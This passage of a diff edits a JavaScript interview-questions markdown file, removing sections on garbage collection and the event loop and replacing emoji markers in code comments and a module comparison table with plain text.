+//  4. Use custom request headers — simple AJAX requests don\'t send custom headers
 //    so requiring a custom header (X-Requested-With) blocks simple cross-site forms
 ```
 
@@ -18054,106 +18404,6 @@ In this example, setting `myObj` to `null` removes the only reference to the obj
     <b><a href="#table-of-contents">↥ back to top</a></b>
 </div>
 
-## Q. How Garbage Collection works in JavaScript?
-
-JavaScript has an automatic garbage collector that periodically frees up memory that is no longer being used by the program. The garbage collector works by identifying "garbage" values that are no longer accessible or needed by the program and freeing up the memory they occupy.
-
-**Example**
-
-```js
-let a = { b: { c: { d: "Hello" } } };
-let e = a.b.c;
-a = null;
-```
-In this code, the object `{ b: { c: { d: "Hello" } } }` is created and assigned to the variable a. The variable e is then assigned a reference to the nested object `{ c: { d: "Hello" } }`. Finally, the variable a is set to null, which means that the original object `{ b: { c: { d: "Hello" } } }` is no longer accessible by the program.
-
-At this point, the garbage collector will identify the object `{ b: { c: { d: "Hello" } } }` as "garbage" because it is no longer accessible by the program. The garbage collector will then free up the memory occupied by this object.
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is the JavaScript Event Loop?
-
-The **Event Loop** is the mechanism that allows JavaScript — a single-threaded language — to perform non-blocking asynchronous operations. It continuously monitors the **call stack** and the **task queues** and moves tasks from the queues to the stack when the stack is empty.
-
-**Components:**
-
-* **Call Stack** — executes synchronous code one frame at a time (LIFO).
-* **Web APIs** (or Node.js APIs) — handle async operations like `setTimeout`, `fetch`, DOM events.
-* **Macrotask queue** (Task Queue) — holds callbacks from `setTimeout`, `setInterval`, I/O, UI events.
-* **Microtask queue** — holds Promise callbacks (`.then`, `.catch`, `.finally`) and `queueMicrotask()`.
-
-**Execution order:**
-
-1. Execute all synchronous code on the call stack.
-2. Drain the **entire** microtask queue (including any microtasks added during this step).
-3. Pick **one** macrotask from the macrotask queue.
-4. Repeat from step 2.
-
-**Example:**
-
-```js
-console.log('1 - sync');
-
-setTimeout(() => console.log('2 - setTimeout (macrotask)'), 0);
-
-Promise.resolve()
-  .then(() => console.log('3 - Promise.then (microtask)'))
-  .then(() => console.log('4 - Promise.then (microtask)'));
-
-console.log('5 - sync');
-
-// Output:
-// 1 - sync
-// 5 - sync
-// 3 - Promise.then (microtask)
-// 4 - Promise.then (microtask)
-// 2 - setTimeout (macrotask)
-```
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is the difference between microtask queue and macrotask queue?
-
-| Feature          | Microtask Queue                          | Macrotask Queue                        |
-|------------------|------------------------------------------|----------------------------------------|
-| Also called      | Job queue                                | Task queue / callback queue            |
-| Sources          | `Promise.then/catch/finally`, `queueMicrotask()`, `MutationObserver` | `setTimeout`, `setInterval`, `setImmediate` (Node), I/O, UI events |
-| Priority         | **Higher** — runs before next macrotask  | Lower — runs one at a time             |
-| When processed   | After every task, until queue is empty   | One per event loop iteration           |
-
-**Example showing microtasks before macrotasks:**
-
-```js
-setTimeout(() => console.log('macrotask 1'), 0);
-setTimeout(() => console.log('macrotask 2'), 0);
-
-Promise.resolve()
-  .then(() => {
-    console.log('microtask 1');
-    return Promise.resolve();
-  })
-  .then(() => console.log('microtask 2'));
-
-queueMicrotask(() => console.log('microtask 3'));
-
-// Output:
-// microtask 1
-// microtask 3
-// microtask 2
-// macrotask 1
-// macrotask 2
-```
-
-*Note: All microtasks are fully drained before the event loop picks the next macrotask.*
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
 ## Q. What are the SOLID principles in JavaScript?
 
 **SOLID** is an acronym for five object-oriented design principles that make software more maintainable and extensible.
@@ -18163,13 +18413,13 @@ queueMicrotask(() => console.log('microtask 3'));
 A class/function should have only one reason to change.
 
 ```js
-// ❌ Violates SRP — handles both business logic and persistence
+//  Violates SRP — handles both business logic and persistence
 class UserService {
   createUser(data) { /* validate + save to DB */ }
   sendWelcomeEmail(user) { /* send email */ }
 }
 
-// ✅ Each class has one responsibility
+//  Each class has one responsibility
 class UserRepository { save(user) { /* DB logic */ } }
 class EmailService    { sendWelcome(user) { /* email logic */ } }
 class UserService {
@@ -18187,7 +18437,7 @@ class UserService {
 Open for extension, closed for modification.
 
 ```js
-// ✅ Add new discount types without modifying existing code
+//  Add new discount types without modifying existing code
 class DiscountStrategy { apply(price) { return price; } }
 class StudentDiscount  extends DiscountStrategy { apply(p) { return p * 0.8; } }
 class SeniorDiscount   extends DiscountStrategy { apply(p) { return p * 0.7; } }
@@ -18208,7 +18458,7 @@ No code should be forced to depend on methods it does not use. In JavaScript thi
 High-level modules should not depend on low-level modules. Both should depend on abstractions.
 
 ```js
-// ✅ OrderService depends on an abstraction (any object with .save())
+//  OrderService depends on an abstraction (any object with .save())
 class OrderService {
   constructor(repository) { this.repository = repository; }
   placeOrder(order) { return this.repository.save(order); }
@@ -18283,7 +18533,7 @@ The **12-Factor App** is a methodology for building modern, scalable, maintainab
 **JavaScript example — Factor 3 (Config):**
 
 ```js
-// ✅ Config from environment variables
+//  Config from environment variables
 const config = {
   port:       process.env.PORT       || 3000,
   dbUrl:      process.env.DATABASE_URL,
@@ -18366,8 +18616,8 @@ import Calculator, { add } from './math.js';
 |-|-----|-----|-----|-----|
 | Environment | Node.js | Browser | Both | Both (modern) |
 | Loading | Sync | Async | Both | Static/Dynamic |
-| Tree-shakeable | ❌ | ❌ | ❌ | ✅ |
-| Native browser support | ❌ | ❌ | ❌ | ✅ |
+| Tree-shakeable | No | No | No | Yes |
+| Native browser support | No | No | No | Yes |
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
